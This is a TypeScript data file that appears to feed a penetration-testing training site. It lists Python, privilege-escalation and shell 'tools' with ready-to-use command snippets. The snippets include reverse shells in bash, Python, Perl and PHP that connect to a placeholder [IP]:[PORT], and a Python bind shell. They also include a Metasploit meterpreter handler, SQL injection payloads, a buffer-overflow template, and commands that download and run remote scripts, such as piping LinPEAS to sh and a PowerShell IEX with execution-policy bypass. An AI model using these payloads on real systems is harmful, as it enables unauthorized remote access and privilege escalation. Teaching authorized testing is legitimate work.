import { Terminal, Shield, Code, BookOpen, Target, Award, Brain, Bug, Cpu, Globe, Lock, Webhook } from 'lucide-react';
import type { Tool, Certification, LifecyclePhase, Technique } from '../types';

export const tools: Tool[] = [
  {
    id: 'python',
    title: 'Python for Pentesting',
    path: '/tools/python',
    description: 'Master Python scripting for security testing',
    icon: Code,
    content: {
      title: 'Python for Penetration Testing',
      description: 'Python is an essential language for penetration testing, allowing you to create custom tools, automate tasks, and exploit vulnerabilities.',
      premiumFeatures: [
        'Advanced exploit development',
        'Custom tool creation',
        'Automation frameworks',
        'Real-world scripts'
      ]
    },
    sections: [
      {
        id: 'networking',
        title: 'Networking',
        content: 'Python provides powerful networking capabilities through libraries like socket and scapy.',
        commands: [
          [
            'import socket\n\ns = socket.socket()\ns.connect((\"[IP]\", [PORT]))\ndata = s.recv(1024)\ns.close()',
            'Basic TCP client'
          ],
          [
            'import socket\n\ndef scan_port(ip, port):\n    sock = socket.socket()\n    result = sock.connect_ex((ip, port))\n    sock.close()\n    return result == 0',
            'Simple port scanner'
          ],
          [
            'import requests\n\nresponse = requests.get("http://[IP]:[PORT]")\nprint(response.text)',
            'HTTP request'
          ],
          [
            'from scapy.all import *\n\narp = ARP(pdst=\"[IP]/24\")\nans = sr1(arp)',
            'Scapy ARP scan'
          ]
        ]
      },
      {
        id: 'web-hacking',
        title: 'Web Hacking',
        content: 'Create scripts for web vulnerability scanning and exploitation.',
        commands: [
          [
            'import requests\nfrom bs4 import BeautifulSoup\n\nresp = requests.get("http://[IP]")\nsoup = BeautifulSoup(resp.text, "html.parser")\nlinks = soup.find_all("a")',
            'Basic web crawler'
          ],
          [
            'import requests\n\nwith open("wordlist.txt") as f:\n    for line in f:\n        url = "http://[IP]/" + line.strip()\n        r = requests.get(url)\n        if r.status_code == 200:\n            print("Found: " + url)',
            'Directory bruteforce'
          ],
          [
            'import requests\n\npayloads = ["\'", "1 OR 1=1", "\' OR \'1\'=\'1"]\nfor p in payloads:\n    r = requests.get("http://[IP]/?id=" + p)',
            'SQL injection test'
          ]
        ]
      },
      {
        id: 'exploit-dev',
        title: 'Exploit Development',
        content: 'Create exploits and proof-of-concept code using Python.',
        commands: [
          [
            'buffer = "A" * 100\neip = "B" * 4\nshellcode = "\\x90" * 16\n\npayload = buffer + eip + shellcode',
            'Buffer overflow template'
          ],
          [
            'import socket,subprocess,os\ns = socket.socket()\ns.connect((\"[IP]\", [PORT]))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])',
            'Simple reverse shell'
          ],
          [
            'def pattern_create(length):\n    pattern = ""\n    for i in range(length):\n        pattern += chr(65 + (i % 26))\n    return pattern',
            'Pattern creation'
          ]
        ]
      }
    ]
  },
  {
    id: 'privesc',
    title: 'Privilege Escalation',
    path: '/tools/privesc',
    description: 'Learn Linux and Windows privilege escalation',
    icon: Lock,
    content: {
      title: 'Privilege Escalation Techniques',
      description: 'Privilege escalation is a critical phase in penetration testing, allowing attackers to gain higher-level access to systems.',
      premiumFeatures: [
        'Advanced escalation techniques',
        'Custom exploitation scripts',
        'Real-world case studies',
        'Automated tools development'
      ]
    },
    sections: [
      {
        id: 'linux-privesc',
        title: 'Linux Privilege Escalation',
        content: 'Linux systems offer various privilege escalation paths through misconfigurations, vulnerable services, and weak permissions.',
        commands: [
          [
            'id && uname -a && cat /etc/issue',
            'Basic system enumeration'
          ],
          [
            'find / -perm -u=s -type f 2>/dev/null',
            'Find SUID binaries'
          ],
          [
            'sudo -l',
            'Check sudo permissions'
          ],
          [
            'cat /etc/crontab',
            'List cron jobs'
          ],
          [
            'find / -writable -type f 2>/dev/null',
            'Check for writable files'
          ],
          [
            'ps aux | grep root',
            'Process enumeration'
          ]
        ]
      },
      {
        id: 'windows-privesc',
        title: 'Windows Privilege Escalation',
        content: 'Windows systems have unique privilege escalation vectors including services, registry entries, and scheduled tasks.',
        commands: [
          [
            'systeminfo',
            'System info'
          ],
          [
            'whoami /priv',
            'Check privileges'
          ],
          [
            'wmic service get name,pathname',
            'List services'
          ],
          [
            'schtasks /query /fo LIST /v',
            'Check scheduled tasks'
          ],
          [
            'netstat -ano',
            'Network connections'
          ],
          [
            'wmic product get name,version',
            'List installed software'
          ]
        ]
      },
      {
        id: 'automated-tools',
        title: 'Automated Tools',
        content: 'Various tools can automate the privilege escalation enumeration process.',
        commands: [
          [
            'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
            'LinPEAS'
          ],
          [
            'wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh',
            'Linux Smart Enumeration'
          ],
          [
            'powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\'); Invoke-AllChecks"',
            'Windows Privilege Escalation Awesome Scripts'
          ],
          [
            'winPEASany.exe',
            'WinPEAS'
          ]
        ]
      }
    ]
  },
  {
    id: 'shells',
    title: 'Shells',
    path: '/tools/shells',
    description: 'Master various reverse shell techniques',
    icon: Terminal,
    content: {
      title: 'Reverse Shell Techniques',
      description: 'Reverse shells are essential tools in penetration testing, allowing attackers to gain remote access to compromised systems.',
      premiumFeatures: [
        'Advanced shell techniques',
        'Custom shell handlers',
        'Evasion methods',
        'Persistence mechanisms'
      ]
    },
    sections: [
      {
        id: 'basic-shells',
        title: 'Basic Reverse Shells',
        content: 'Basic reverse shell commands in various languages.',
        commands: [
          [
            'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1',
            'Bash reverse shell'
          ],
          [
            'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])\'',
            'Python reverse shell'
          ],
          [
            'perl -e \'use Socket;$i="[IP]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
            'Perl reverse shell'
          ],
          [
            'php -r \'$sock=fsockopen("[IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");\'',
            'PHP reverse shell'
          ]
        ]
      },
      {
        id: 'listeners',
        title: 'Shell Listeners',
        content: 'Different methods of setting up listeners to catch reverse shells.',
        commands: [
          [
            'nc -lvnp [PORT]',
            'Netcat listener'
          ],
          [
            'msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST [IP]; set LPORT [PORT]; run"',
            'Metasploit listener'
          ],
          [
            'socat TCP-LISTEN:[PORT],fork STDOUT',
            'Socat listener'
          ],
          [
            'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\'0.0.0.0\',[PORT]));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"',
            'Python listener'
          ]
        ]
      },
      {
        id: 'upgrading',
        title: 'Shell Upgrading',
        content: 'Methods to upgrade simple shells to fully interactive TTY shells.',
        commands: [
          [
            'python -c \'import pty; pty.spawn("/bin/bash")\'',
            'Python TTY upgrade'
          ],
          [
            'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:[IP]:[PORT]',
            'Socat TTY upgrade'
          ],
          [
            'python -c \'import pty;pty.spawn("/bin/bash")\'\nCtrl+Z\nstty raw -echo;fg\nreset\nexport TERM=xterm',
            'Full TTY upgrade process'
          ]
        ]
      }
    ]
  },
  // ... (rest of the existing tools)
];



export const lifecyclePhases: LifecyclePhase[] = [
  // ... (existing lifecycle phases)
];

export const techniques: Technique[] = [
  // ... (existing techniques)
];
